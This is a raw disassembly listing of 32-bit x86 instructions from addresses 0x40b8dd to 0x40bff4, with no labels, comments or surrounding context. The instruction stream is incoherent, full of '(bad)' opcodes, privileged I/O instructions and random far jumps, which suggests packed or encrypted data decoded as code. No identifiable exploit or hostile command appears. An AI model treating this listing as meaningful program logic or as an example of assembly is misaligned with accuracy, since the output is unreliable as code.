  40b8dd:	jno    0x40b958
  40b8df:	xor    BYTE PTR gs:[edi+ebp*1+0x54],bh
  40b8e4:	mov    ebp,0x62c12026
  40b8e9:	add    esp,DWORD PTR [ebx+ebx*4+0x2c8dbae7]
  40b8f0:	fs jns 0x40b90e
  40b8f3:	push   eax
  40b8f4:	adc    ch,BYTE PTR [edx-0x40]
  40b8f7:	cld    
  40b8f8:	data16 rcl BYTE PTR [eax],0x7f
  40b8fc:	xlat   BYTE PTR ds:[ebx]
  40b8fd:	mov    bl,BYTE PTR [edi-0x2c6bc7c]
  40b903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b904:	loop   0x40b91b
  40b906:	dec    edi
  40b907:	and    esi,DWORD PTR [eax+0x373b48dd]
  40b90d:	xchg   ebp,eax
  40b90e:	fs loope 0x40b96c
  40b911:	mov    al,ds:0x5cbac9da
  40b916:	fstp   QWORD PTR [esi-0x2d6b71a1]
  40b91c:	cmp    DWORD PTR [esi-0x3565859],eax
  40b922:	xchg   ebp,eax
  40b923:	cmp    eax,0x9cd148f9
  40b928:	push   ss
  40b929:	jno    0x40b8ee
  40b92b:	cdq    
  40b92c:	sahf   
  40b92d:	ret    
  40b92e:	xor    al,0x9d
  40b930:	ficom  DWORD PTR [ecx+0x4f]
  40b933:	fnstcw WORD PTR [esi]
  40b935:	mov    edx,0xdfbb18a6
  40b93a:	daa    
  40b93b:	adc    DWORD PTR [ecx+0x69],esi
  40b93e:	js     0x40b8c5
  40b940:	imul   ebp,DWORD PTR [edx+0x2a2c3118],0xffffff8a
  40b947:	sub    bh,BYTE PTR [eax]
  40b949:	sub    BYTE PTR [esi+0x57],ch
  40b94c:	sahf   
  40b94d:	dec    ebx
  40b94e:	stos   BYTE PTR es:[edi],al
  40b94f:	ret    0x29a4
  40b952:	imul   esp,DWORD PTR [ebx+0x56],0x3ed85b8c
  40b959:	jae    0x40b9c6
  40b95b:	ds inc edx
  40b95d:	das    
  40b95e:	stos   DWORD PTR es:[edi],eax
  40b95f:	sub    al,0x14
  40b961:	add    DWORD PTR [esi],ecx
  40b963:	adc    ecx,DWORD PTR [eax]
  40b965:	cwde   
  40b966:	mov    bh,0x9c
  40b968:	outs   dx,DWORD PTR ds:[esi]
  40b969:	xchg   DWORD PTR [esp+esi*4],esi
  40b96c:	js     0x40b9cb
  40b96e:	mov    al,ds:0x84e64580
  40b973:	push   ecx
  40b974:	hlt    
  40b975:	lds    esi,FWORD PTR [eax]
  40b977:	mov    edi,0x8bd8b437
  40b97c:	fidiv  DWORD PTR [edi]
  40b97e:	(bad)  [edx]
  40b980:	pop    esp
  40b981:	add    al,0x2b
  40b983:	leave  
  40b984:	inc    eax
  40b985:	xchg   esi,eax
  40b986:	pop    ss
  40b987:	push   es
  40b988:	xor    cl,BYTE PTR [ebx]
  40b98a:	mov    gs,WORD PTR [ebx+0x12]
  40b98d:	pop    es
  40b98e:	jb     0x40b9a0
  40b990:	xor    DWORD PTR [esi],edi
  40b992:	inc    esp
  40b993:	daa    
  40b994:	mov    eax,0xa4de5679
  40b999:	stc    
  40b99a:	in     eax,dx
  40b99b:	cmp    dl,BYTE PTR [eax+edx*4+0xc115b9d]
  40b9a2:	mov    ebx,0x53f6f5d9
  40b9a7:	jecxz  0x40b95e
  40b9a9:	into   
  40b9aa:	xchg   ebp,eax
  40b9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ac:	jne    0x40b9e8
  40b9ae:	rol    DWORD PTR [edx+ebp*4+0x221f7c0f],0x13
  40b9b6:	aaa    
  40b9b7:	data16 adc ch,BYTE PTR [esi-0x24844e77]
  40b9be:	mov    eax,0x62146f25
  40b9c3:	and    al,0xbf
  40b9c5:	sar    DWORD PTR [esi-0xe],cl
  40b9c8:	jnp    0x40b990
  40b9ca:	jbe    0x40ba0f
  40b9cc:	(bad)  
  40b9cd:	leave  
  40b9ce:	pushf  
  40b9cf:	sti    
  40b9d0:	test   dh,0xde
  40b9d3:	pop    ss
  40b9d4:	sub    bh,BYTE PTR [edi+0x25]
  40b9d7:	call   0x6fc4:0xc4ca07e6
  40b9de:	push   ebx
  40b9df:	jb     0x40b97f
  40b9e1:	iret   
  40b9e2:	jb     0x40b98a
  40b9e4:	jl     0x40b984
  40b9e6:	add    eax,DWORD PTR [edx+0x1d]
  40b9e9:	inc    esi
  40b9ea:	mov    db6,edi
  40b9ed:	stos   BYTE PTR es:[edi],al
  40b9ee:	cld    
  40b9ef:	xchg   edx,eax
  40b9f0:	fst    DWORD PTR [ecx]
  40b9f2:	mov    ebp,0xafd575d3
  40b9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9f8:	xor    BYTE PTR [edi-0x6db0b7b9],al
  40b9fe:	jmp    0x7854:0xd1532d3b
  40ba05:	mov    edi,DWORD PTR [esi]
  40ba07:	xchg   esp,eax
  40ba08:	shl    bh,0xcd
  40ba0b:	pop    edi
  40ba0c:	mov    dh,0x2f
  40ba0e:	std    
  40ba0f:	stos   BYTE PTR es:[edi],al
  40ba10:	bound  ebp,QWORD PTR cs:[esi-0xe]
  40ba14:	xchg   edi,eax
  40ba15:	sub    al,0xa1
  40ba17:	outs   dx,BYTE PTR ds:[esi]
  40ba18:	stos   BYTE PTR es:[edi],al
  40ba19:	mov    eax,0x5f7ce4b1
  40ba1e:	sub    DWORD PTR [edx-0x78],edi
  40ba21:	xchg   DWORD PTR [ecx+0x62fca871],ecx
  40ba27:	and    DWORD PTR [edi-0x10],esi
  40ba2a:	or     eax,0xc72f8e30
  40ba2f:	jmp    0x9940:0x10d7b35f
  40ba36:	js     0x40bab1
  40ba38:	imul   ecx,edx,0x7e
  40ba3b:	(bad)  
  40ba3c:	and    bh,BYTE PTR [esp+eax*8+0x17]
  40ba40:	rcr    DWORD PTR [ebx+0x379fe001],cl
  40ba46:	xor    bl,BYTE PTR [ebx-0x1e]
  40ba49:	sub    ah,bl
  40ba4b:	inc    edi
  40ba4c:	aas    
  40ba4d:	xchg   ecx,eax
  40ba4e:	push   edi
  40ba4f:	sbb    DWORD PTR [ebp+0x6f7938ae],edx
  40ba55:	sub    BYTE PTR [edi-0x358844a3],ah
  40ba5b:	inc    eax
  40ba5c:	mov    dl,0x7b
  40ba5e:	cli    
  40ba5f:	(bad)  
  40ba60:	dec    ebx
  40ba61:	cwde   
  40ba62:	repnz dec ecx
  40ba64:	sub    BYTE PTR [edx],al
  40ba66:	aas    
  40ba67:	mov    eax,0x2eb7edfa
  40ba6c:	mov    eax,ds:0xa4a34656
  40ba71:	mov    esi,0x5dd3972a
  40ba76:	push   eax
  40ba77:	int    0x5d
  40ba79:	outs   dx,DWORD PTR ds:[esi]
  40ba7a:	enter  0x47f4,0x56
  40ba7e:	(bad)  
  40ba7f:	cli    
  40ba80:	fs push ebx
  40ba82:	xor    ecx,DWORD PTR ds:0x99a808ce
  40ba88:	shl    BYTE PTR [esi],cl
  40ba8a:	stos   DWORD PTR es:[edi],eax
  40ba8b:	xchg   edx,eax
  40ba8c:	push   ebx
  40ba8d:	lahf   
  40ba8e:	add    eax,0xfa5cfdf0
  40ba93:	adc    eax,0x538b5207
  40ba98:	jno    0x40baa4
  40ba9a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40ba9c:	mov    ds:0x82741995,al
  40baa1:	(bad)
  40baa4:	or     BYTE PTR [ebx+0x7d494d8e],cl
  40baaa:	add    edi,DWORD PTR [ebx+0x25a7e8f0]
  40bab0:	test   BYTE PTR [esi-0x1029c4f2],dh
  40bab6:	dec    ecx
  40bab7:	push   edi
  40bab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab9:	ds das 
  40babb:	pop    es
  40babc:	xchg   edx,eax
  40babd:	mov    edx,0xd874cdf7
  40bac2:	sahf   
  40bac3:	clc    
  40bac4:	xlat   BYTE PTR ds:[ebx]
  40bac5:	test   BYTE PTR [edx],ah
  40bac7:	rcr    DWORD PTR [esp+ebx*8],1
  40baca:	clc    
  40bacb:	and    BYTE PTR [esi-0x25fcd5b],bl
  40bad1:	test   DWORD PTR [esi+eax*2],edi
  40bad4:	inc    ebx
  40bad5:	imul   esi,DWORD PTR [eax-0x7556f3a2],0x4e358aed
  40badf:	sbb    edi,DWORD PTR [eax-0x19c07b1]
  40bae5:	adc    DWORD PTR [edi+0x4d],ebx
  40bae8:	adc    eax,0x36392524
  40baed:	jle    0x40ba96
  40baef:	mov    edx,ebx
  40baf1:	xchg   edx,eax
  40baf2:	add    bl,BYTE PTR [ebx]
  40baf4:	jns    0x40bad2
  40baf6:	add    al,0xf5
  40baf8:	push   ebp
  40baf9:	push   ebp
  40bafa:	ret    
  40bafb:	and    bl,ah
  40bafd:	jge    0x40bb56
  40baff:	fild   DWORD PTR [ecx]
  40bb01:	clc    
  40bb02:	repz inc esi
  40bb04:	mov    ebx,0xbc4f9c0
  40bb09:	sti    
  40bb0a:	add    eax,0x5c2f7631
  40bb0f:	fisttp WORD PTR [ebx]
  40bb11:	mov    ecx,0x5e9f4c6c
  40bb16:	outs   dx,DWORD PTR ds:[esi]
  40bb17:	fs jno 0x40bb0f
  40bb1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb1b:	jo     0x40bb30
  40bb1d:	mov    ah,0x56
  40bb1f:	in     eax,dx
  40bb20:	imul   BYTE PTR [ebx]
  40bb22:	add    eax,0x8e3bbb6a
  40bb27:	adc    al,0x55
  40bb29:	shr    DWORD PTR [ecx],1
  40bb2b:	xchg   BYTE PTR [ebx],ah
  40bb2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2e:	cmp    bl,0x27
  40bb31:	dec    ecx
  40bb32:	dec    eax
  40bb33:	mov    dh,0xa9
  40bb35:	cmp    BYTE PTR [eax],cl
  40bb37:	arpl   WORD PTR [edx-0x69],di
  40bb3a:	add    DWORD PTR [edx-0x1a],ecx
  40bb3d:	ja     0x40bb23
  40bb3f:	fbld   TBYTE PTR [eax+0x1dcb7fb6]
  40bb45:	push   edi
  40bb46:	jge    0x40bb01
  40bb48:	es aaa 
  40bb4a:	pop    edx
  40bb4b:	mov    BYTE PTR [edx-0x6d5e36e0],bl
  40bb51:	push   0x94a50e3a
  40bb56:	call   0xf1dfb9af
  40bb5b:	add    edi,0x27
  40bb5e:	cmp    edx,DWORD PTR [edx]
  40bb60:	sahf   
  40bb61:	inc    esp
  40bb62:	add    al,0x16
  40bb64:	push   edi
  40bb65:	aas    
  40bb66:	lahf   
  40bb67:	jbe    0x40bb3a
  40bb69:	(bad)  
  40bb6b:	lods   eax,DWORD PTR ds:[esi]
  40bb6c:	loopne 0x40bbc1
  40bb6e:	jb     0x40bba9
  40bb70:	add    cl,BYTE PTR [ebx*1-0x61cfb4ae]
  40bb77:	idiv   DWORD PTR [esi+0x51dd55b4]
  40bb7d:	daa    
  40bb7e:	sbb    DWORD PTR [ebp-0x58ef4881],0x7a48a6a0
  40bb88:	cdq    
  40bb89:	jns    0x40bb41
  40bb8b:	ss aad 0x2d
  40bb8e:	fbstp  TBYTE PTR [ecx-0x3a8a26cc]
  40bb94:	xlat   BYTE PTR ds:[ebx]
  40bb95:	dec    ecx
  40bb96:	outs   dx,BYTE PTR ds:[esi]
  40bb97:	adc    eax,0x610bc79e
  40bb9c:	cld    
  40bb9d:	xchg   edx,eax
  40bb9e:	xchg   dh,cl
  40bba0:	pop    ecx
  40bba1:	leave  
  40bba2:	pop    esi
  40bba3:	test   DWORD PTR [edi],0xe3a07e3b
  40bba9:	sbb    dl,BYTE PTR [ebx-0x31]
  40bbac:	add    DWORD PTR [ebx-0x10820d74],esi
  40bbb2:	xchg   esi,eax
  40bbb3:	pop    ss
  40bbb4:	mov    eax,0x100a2cc0
  40bbb9:	popf   
  40bbba:	aad    0xde
  40bbbc:	cli    
  40bbbd:	icebp  
  40bbbe:	pop    ds
  40bbbf:	jecxz  0x40bb9c
  40bbc1:	icebp  
  40bbc2:	aaa    
  40bbc3:	mov    ebx,0x69568dcb
  40bbc8:	scas   al,BYTE PTR es:[edi]
  40bbc9:	(bad)  
  40bbca:	(bad)  
  40bbcc:	jl     0x40bb5b
  40bbce:	mov    dh,0x63
  40bbd0:	lea    ebp,[esi-0x28f60bf9]
  40bbd6:	push   edi
  40bbd7:	inc    edx
  40bbd8:	mov    dh,0x1a
  40bbda:	out    dx,eax
  40bbdb:	mov    ch,0xd9
  40bbdd:	ins    BYTE PTR es:[edi],dx
  40bbde:	das    
  40bbdf:	sbb    bh,al
  40bbe1:	push   es
  40bbe2:	push   edi
  40bbe3:	and    BYTE PTR [edi],bl
  40bbe5:	div    BYTE PTR [edx+0x2b392a77]
  40bbeb:	(bad)  
  40bbed:	je     0x40bbb1
  40bbef:	xchg   ebx,eax
  40bbf0:	and    edx,DWORD PTR [bx-0x67]
  40bbf4:	repz sub eax,0x88c74c31
  40bbfa:	inc    eax
  40bbfb:	xchg   esp,eax
  40bbfc:	out    dx,al
  40bbfd:	not    ebp
  40bbff:	xchg   edx,eax
  40bc00:	cmp    DWORD PTR [ebx+0x300c34a1],edi
  40bc06:	pop    esp
  40bc07:	sbb    ecx,DWORD PTR [edx+0x2f]
  40bc0a:	inc    ecx
  40bc0b:	adc    DWORD PTR [esi],edx
  40bc0d:	fst    DWORD PTR [eax]
  40bc0f:	fcomp  QWORD PTR [edx-0x65]
  40bc12:	push   esi
  40bc13:	xchg   ebp,eax
  40bc14:	adc    al,0x84
  40bc16:	inc    esp
  40bc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc18:	xchg   ebx,eax
  40bc19:	mov    ss,esi
  40bc1b:	idiv   DWORD PTR [edi+esi*2]
  40bc1e:	(bad)  [ebx]
  40bc20:	xlat   BYTE PTR ds:[ebx]
  40bc21:	(bad)  
  40bc22:	scas   al,BYTE PTR es:[edi]
  40bc23:	inc    ebp
  40bc24:	add    DWORD PTR [edi-0x5763f8f],edx
  40bc2a:	aaa    
  40bc2b:	push   esi
  40bc2c:	lahf   
  40bc2d:	aaa    
  40bc2e:	es shl DWORD PTR gs:[esi],1
  40bc32:	cmp    edi,eax
  40bc34:	mov    al,ds:0xd3dc979d
  40bc39:	cmp    eax,0x3089bd6
  40bc3e:	(bad)  
  40bc3f:	retf   
  40bc40:	add    eax,0x285c7aa7
  40bc45:	popf   
  40bc46:	leave  
  40bc47:	adc    DWORD PTR [ebx+eiz*2-0x26c80fd4],edx
  40bc4e:	rol    DWORD PTR [eax],0x92
  40bc51:	ins    BYTE PTR es:[edi],dx
  40bc52:	cld    
  40bc53:	dec    esi
  40bc54:	sbb    al,0x4d
  40bc56:	call   0xbdff1479
  40bc5b:	sub    DWORD PTR [edi],eax
  40bc5d:	arpl   WORD PTR [edx],di
  40bc5f:	cmp    ebp,edx
  40bc61:	fdivr  st,st(1)
  40bc63:	std    
  40bc64:	cli    
  40bc65:	or     BYTE PTR [edi+ebp*8+0x68],0x1e
  40bc6a:	pavgb  mm0,QWORD PTR [edi-0x7]
  40bc6e:	xor    eax,0x509a3a31
  40bc73:	or     BYTE PTR [edi+eiz*4+0x28b82a50],cl
  40bc7a:	neg    BYTE PTR [esi-0x66f1c891]
  40bc80:	adc    DWORD PTR [esp+edi*4],0xc0c58a04
  40bc87:	mov    eax,0x9aef52d4
  40bc8c:	rol    BYTE PTR [esi+0x5c],cl
  40bc8f:	jb     0x40bc81
  40bc91:	nop
  40bc92:	and    esp,DWORD PTR es:[ebp+0x5ca28b8a]
  40bc99:	adc    al,ah
  40bc9b:	daa    
  40bc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc9e:	loopne 0x40bcc1
  40bca0:	inc    ecx
  40bca1:	scas   al,BYTE PTR es:[edi]
  40bca2:	mov    eax,0x662d7ac8
  40bca7:	xrelease mov DWORD PTR [edx-0x2c5afaff],ebp
  40bcae:	bound  eax,QWORD PTR [edi-0x70]
  40bcb1:	mov    ds:0x5ae84390,al
  40bcb6:	js     0x40bc65
  40bcb8:	mov    ch,0xaa
  40bcba:	sbb    edi,DWORD PTR [ebp-0x60]
  40bcbd:	jmp    0x9a06:0x1e6504da
  40bcc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcc5:	pop    ss
  40bcc6:	pop    es
  40bcc7:	push   ebx
  40bcc8:	sahf   
  40bcc9:	dec    esp
  40bcca:	lods   al,BYTE PTR ds:[esi]
  40bccb:	push   ebp
  40bccc:	mov    ds:0xf13b99e,al
  40bcd1:	push   es
  40bcd2:	mov    bh,0x5d
  40bcd4:	xchg   ecx,eax
  40bcd5:	pushf  
  40bcd6:	stos   BYTE PTR es:[edi],al
  40bcd7:	mov    esp,0x59de98e6
  40bcdc:	mov    ecx,0x74c537f4
  40bce1:	lea    esi,[eax+0x7f6dfa66]
  40bce7:	mov    ds:0x2299bfc4,eax
  40bcec:	(bad)  
  40bced:	and    BYTE PTR [edx+0x7c30b717],bl
  40bcf3:	xor    ecx,DWORD PTR [eax-0x12]
  40bcf6:	inc    esp
  40bcf7:	in     eax,0x44
  40bcf9:	das    
  40bcfa:	xchg   esi,eax
  40bcfb:	cmp    eax,0x7106bded
  40bd00:	rol    BYTE PTR [ecx-0x66],1
  40bd03:	(bad)  
  40bd04:	sub    edi,DWORD PTR [edi-0x48d27aaf]
  40bd0a:	push   esp
  40bd0b:	loop   0x40bce6
  40bd0d:	push   DWORD PTR [eax+eax*4-0x57]
  40bd11:	aad    0x60
  40bd13:	dec    esi
  40bd14:	adc    BYTE PTR [esi],al
  40bd16:	fwait
  40bd17:	push   cs
  40bd18:	mov    bl,0x14
  40bd1a:	test   DWORD PTR [ecx+0x473d7e6c],esi
  40bd20:	rcl    edx,cl
  40bd22:	(bad)  
  40bd23:	lahf   
  40bd24:	ja     0x40bcd2
  40bd26:	push   ecx
  40bd27:	fs loope 0x40bd38
  40bd2a:	and    esp,eax
  40bd2c:	stos   BYTE PTR es:[edi],al
  40bd2d:	mov    dh,0x7
  40bd2f:	push   edi
  40bd30:	cmp    esi,DWORD PTR [eax+0x65]
  40bd33:	lods   eax,DWORD PTR ds:[esi]
  40bd34:	or     al,0xc6
  40bd36:	and    ah,BYTE PTR ds:[ebx+eax*8+0x19]
  40bd3b:	les    ebp,FWORD PTR [edi+ecx*8+0xf]
  40bd3f:	sub    al,0x5
  40bd41:	or     edi,DWORD PTR [edx-0x87212e8]
  40bd47:	jl     0x40bccb
  40bd49:	icebp  
  40bd4a:	push   0xffffffed
  40bd4c:	lahf   
  40bd4d:	dec    eax
  40bd4e:	xchg   esi,eax
  40bd4f:	les    esi,FWORD PTR [ebp+ebx*4+0x2cdb0b32]
  40bd56:	repnz dec ebp
  40bd58:	pop    ecx
  40bd59:	cmp    dh,BYTE PTR [ebp-0x6eb3fd2b]
  40bd5f:	and    eax,0x13f1e734
  40bd64:	sbb    al,0x20
  40bd66:	cmp    ebp,DWORD PTR [edi-0x4b5f7d7d]
  40bd6c:	mov    ds:0x226f55f5,eax
  40bd71:	jb     0x40bdd1
  40bd73:	in     eax,dx
  40bd74:	fwait
  40bd75:	or     al,0x62
  40bd77:	mov    ah,0x1f
  40bd79:	mov    edi,0x545c470
  40bd7e:	aad    0x1e
  40bd80:	and    DWORD PTR [eax-0x35],ecx
  40bd83:	fs inc esp
  40bd85:	sbb    bl,BYTE PTR [esp+ebp*1]
  40bd88:	sbb    eax,DWORD PTR [ebp+0x58b8a7b5]
  40bd8e:	cs je  0x40bdbb
  40bd91:	std    
  40bd92:	sub    BYTE PTR [ecx],bl
  40bd94:	and    BYTE PTR [ecx+ebx*8],0xc2
  40bd98:	loop   0x40bd5e
  40bd9a:	mov    dh,0x4a
  40bd9c:	stos   BYTE PTR es:[edi],al
  40bd9d:	pushf  
  40bd9e:	xchg   ebp,eax
  40bd9f:	repnz stc 
  40bda1:	pushf  
  40bda2:	leave  
  40bda3:	popf   
  40bda4:	ja     0x40bd32
  40bda6:	cmp    ebp,DWORD PTR [ebx-0x80]
  40bda9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdaa:	mov    dl,0x65
  40bdac:	ds retf 0xefed
  40bdb0:	(bad)  
  40bdb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb2:	inc    edx
  40bdb3:	and    DWORD PTR [ecx+0x6],edi
  40bdb6:	cli    
  40bdb7:	enter  0xa5a2,0x9b
  40bdbb:	mov    ds:0xf26fa780,eax
  40bdc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdc1:	shl    BYTE PTR [ebx+0x3b5c2842],1
  40bdc7:	fist   DWORD PTR [esi+0x247b67e3]
  40bdcd:	and    ebx,DWORD PTR [ecx+edi*1+0x29]
  40bdd1:	mov    gs,WORD PTR [esi]
  40bdd3:	mov    esp,0xe83c631b
  40bdd8:	neg    edi
  40bdda:	xchg   BYTE PTR [eax+eax*4],cl
  40bddd:	popa   
  40bdde:	mov    edx,0x5c72bcf2
  40bde3:	stc    
  40bde4:	push   eax
  40bde5:	or     BYTE PTR [edx+eax*4],al
  40bde8:	sub    al,0x90
  40bdea:	dec    BYTE PTR ds:0x812bcfde
  40bdf0:	js     0x40be67
  40bdf2:	push   esp
  40bdf3:	pop    ebp
  40bdf4:	and    DWORD PTR [esi+0x63],eax
  40bdf7:	add    BYTE PTR [edx+edi*2],bl
  40bdfa:	xchg   edx,eax
  40bdfb:	jbe    0x40bd8a
  40bdfd:	jle    0x40be74
  40bdff:	jle    0x40bd93
  40be01:	inc    ecx
  40be02:	mov    edi,0xeb3cb80d
  40be07:	xchg   ebp,eax
  40be08:	ins    BYTE PTR es:[edi],dx
  40be09:	fcomp  st(1)
  40be0b:	int    0x54
  40be0d:	sahf   
  40be0e:	inc    eax
  40be0f:	xchg   ebp,eax
  40be10:	or     DWORD PTR ds:0xc10eaa7a,ebp
  40be16:	dec    esp
  40be17:	shr    BYTE PTR [ecx+0x50],1
  40be1a:	outs   dx,BYTE PTR ds:[esi]
  40be1b:	dec    ebp
  40be1c:	push   ds
  40be1d:	adc    DWORD PTR [esi],esi
  40be1f:	aad    0xf5
  40be21:	stos   BYTE PTR es:[edi],al
  40be22:	fsub   DWORD PTR [edx]
  40be24:	jnp    0x40be99
  40be26:	cmp    al,0x5f
  40be28:	jns    0x40bdd1
  40be2a:	push   ss
  40be2b:	call   0xc73f:0xcfcf2fdd
  40be32:	dec    ch
  40be34:	jle    0x40bde1
  40be36:	ret    0xf219
  40be39:	stos   BYTE PTR es:[edi],al
  40be3a:	lea    edx,[eax-0x44]
  40be3d:	mov    bh,0x60
  40be3f:	mov    dh,0xd1
  40be41:	out    dx,al
  40be42:	aas    
  40be43:	hlt    
  40be44:	cli    
  40be45:	loopne 0x40bdf6
  40be47:	mov    edx,DWORD PTR ss:[edi]
  40be4a:	loope  0x40bdf1
  40be4c:	xchg   edi,eax
  40be4d:	jecxz  0x40be2e
  40be4f:	xor    edx,ebx
  40be51:	mov    eax,DWORD PTR [edi+edi*4+0x26]
  40be55:	stc    
  40be56:	in     eax,dx
  40be57:	call   0xb678:0x7589fd98
  40be5e:	mov    esp,0x9c3656e4
  40be63:	mov    ah,0xb4
  40be65:	pusha  
  40be66:	pop    edi
  40be67:	pop    edx
  40be68:	mov    cl,0xfb
  40be6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6b:	add    al,0x77
  40be6d:	xchg   ebx,eax
  40be6e:	and    DWORD PTR [ebp-0x68c7fbf4],esi
  40be74:	or     ebx,ecx
  40be76:	xlat   BYTE PTR ds:[ebx]
  40be77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be78:	adc    edi,eax
  40be7a:	jae    0x40be63
  40be7c:	imul   eax,DWORD PTR [ecx+edi*1-0x39c965a3],0xffffff97
  40be84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be85:	jae    0x40be33
  40be87:	loop   0x40bed7
  40be89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be8a:	mov    esp,0x440b13b3
  40be8f:	mov    edx,0x16881f33
  40be94:	ret    0x2b02
  40be97:	test   ecx,0x5577621e
  40be9d:	or     BYTE PTR [ecx+edx*4],ch
  40bea0:	mov    ecx,DWORD PTR [ecx]
  40bea2:	and    BYTE PTR [ecx-0x3e],ch
  40bea5:	inc    eax
  40bea6:	test   DWORD PTR [edx+eiz*4+0x6de04245],0xbd5bbc48
  40beb1:	adc    al,0x7a
  40beb3:	sub    dh,ch
  40beb5:	mov    eax,ds:0xb2d070af
  40beba:	or     DWORD PTR [ecx],ebx
  40bebc:	and    BYTE PTR [eax],dh
  40bebe:	pop    ds
  40bebf:	push   edi
  40bec0:	jge    0x40bf1f
  40bec2:	sub    DWORD PTR [ebx+edi*2-0x68],0x219b0506
  40beca:	pop    ss
  40becb:	jmp    0x6ee1c92e
  40bed0:	xor    eax,0xf2e20f11
  40bed5:	pop    ss
  40bed6:	das    
  40bed7:	inc    ebx
  40bed8:	add    ecx,DWORD PTR [ebp+esi*8+0x90eaca2]
  40bedf:	xchg   BYTE PTR [ecx+0x29f96e36],cl
  40bee5:	out    0x85,al
  40bee7:	mov    ecx,0x4be12eea
  40beec:	pop    ds
  40beed:	xchg   esi,eax
  40beee:	stc    
  40beef:	add    al,0x56
  40bef1:	pop    ebp
  40bef2:	pop    ebp
  40bef3:	jnp    0x40be89
  40bef5:	mov    cl,0x59
  40bef7:	jle    0x40bed9
  40bef9:	and    ecx,ebp
  40befb:	rcl    DWORD PTR [ebx],0xd9
  40befe:	call   0xd3e66fa7
  40bf03:	loop   0x40beca
  40bf05:	nop
  40bf06:	(bad)  
  40bf07:	mov    es:0x316f3dc8,eax
  40bf0d:	push   esp
  40bf0e:	pop    ebp
  40bf0f:	sub    BYTE PTR [eax-0x75],0x41
  40bf13:	sbb    BYTE PTR [eax],dl
  40bf15:	repz ret 0xabe5
  40bf19:	cld    
  40bf1a:	inc    eax
  40bf1b:	xor    eax,0x26a7ecc4
  40bf20:	pop    es
  40bf21:	(bad)  
  40bf22:	and    ecx,edx
  40bf24:	add    esp,ecx
  40bf26:	je     0x40bec7
  40bf28:	stos   BYTE PTR es:[edi],al
  40bf29:	jne    0x40bf90
  40bf2b:	sbb    BYTE PTR [ecx],cl
  40bf2d:	in     eax,dx
  40bf2e:	and    esp,esp
  40bf30:	pushf  
  40bf31:	lea    ebp,[ebx]
  40bf33:	or     ecx,DWORD PTR [ebx]
  40bf35:	retf   
  40bf36:	je     0x40bfa1
  40bf38:	cwde   
  40bf39:	repz jg 0x40bebf
  40bf3c:	scas   eax,DWORD PTR es:[edi]
  40bf3d:	xchg   BYTE PTR [eax+0x650130c7],ah
  40bf43:	popa   
  40bf44:	or     BYTE PTR [eax-0x28cad553],0x1
  40bf4b:	fadd   QWORD PTR [edx+0x13]
  40bf4e:	xor    ebx,DWORD PTR [ecx-0x26d29bdc]
  40bf54:	daa    
  40bf55:	inc    ebp
  40bf56:	cmp    al,0x94
  40bf58:	lea    esp,[esi+edi*2+0x5a1b8657]
  40bf5f:	jne    0x40bfde
  40bf61:	mov    cl,0x52
  40bf63:	jns    0x40bf6c
  40bf65:	jo     0x40bf29
  40bf67:	fisub  WORD PTR [edi]
  40bf69:	iret   
  40bf6a:	test   eax,0x53abf99d
  40bf6f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf71:	iret   
  40bf72:	jnp    0x40bfa9
  40bf74:	outs   dx,DWORD PTR ds:[esi]
  40bf75:	pop    ebx
  40bf76:	jno    0x40bfee
  40bf78:	adc    edx,DWORD PTR [ebx]
  40bf7a:	sbb    DWORD PTR [edx],esi
  40bf7c:	push   ss
  40bf7d:	lods   eax,DWORD PTR ds:[esi]
  40bf7e:	jae    0x40bf75
  40bf80:	mov    esi,0xbe79ce89
  40bf85:	neg    al
  40bf87:	sbb    eax,0xac4f6d50
  40bf8c:	add    DWORD PTR [ebp+0x716d5ce1],0x4e
  40bf93:	adc    al,0xc0
  40bf95:	into   
  40bf96:	mov    edi,0xedca173
  40bf9b:	xchg   esp,eax
  40bf9c:	lea    esp,[ebx]
  40bf9e:	jo     0x40bf39
  40bfa0:	ret    
  40bfa1:	sbb    al,0x67
  40bfa3:	test   eax,0xd6ab51fe
  40bfa8:	loopne 0x40c01e
  40bfaa:	ins    DWORD PTR es:[edi],dx
  40bfab:	(bad)  
  40bfac:	in     al,0x51
  40bfae:	mov    esi,0xb228efa
  40bfb3:	ins    DWORD PTR es:[edi],dx
  40bfb4:	add    esi,DWORD PTR [eax-0x2c]
  40bfb7:	imul   edi,DWORD PTR [ebx+0x66],0xb13ac019
  40bfbe:	rcr    BYTE PTR [edx-0x6b27724],0x86
  40bfc5:	int    0xd
  40bfc7:	jae    0x40c046
  40bfc9:	and    edx,edx
  40bfcb:	imul   ecx,DWORD PTR [edi],0x3a
  40bfce:	sar    eax,1
  40bfd0:	push   ebx
  40bfd1:	pop    esi
  40bfd2:	ss leavew 
  40bfd5:	out    dx,al
  40bfd6:	xchg   edi,esi
  40bfd8:	adc    al,0xc8
  40bfda:	lock addr16 xor ecx,ecx
  40bfde:	add    BYTE PTR [edi+0x10],ah
  40bfe1:	std    
  40bfe2:	icebp  
  40bfe3:	push   ss
  40bfe4:	js     0x40c062
  40bfe6:	dec    ecx
  40bfe7:	stos   BYTE PTR es:[edi],al
  40bfe8:	pop    eax
  40bfe9:	mov    esi,0x6e355f99
  40bfee:	pop    edx
  40bfef:	push   es
  40bff0:	scas   eax,DWORD PTR es:[edi]
  40bff1:	(bad)  [eax+0x2b]
  40bff4:	inc    ebx
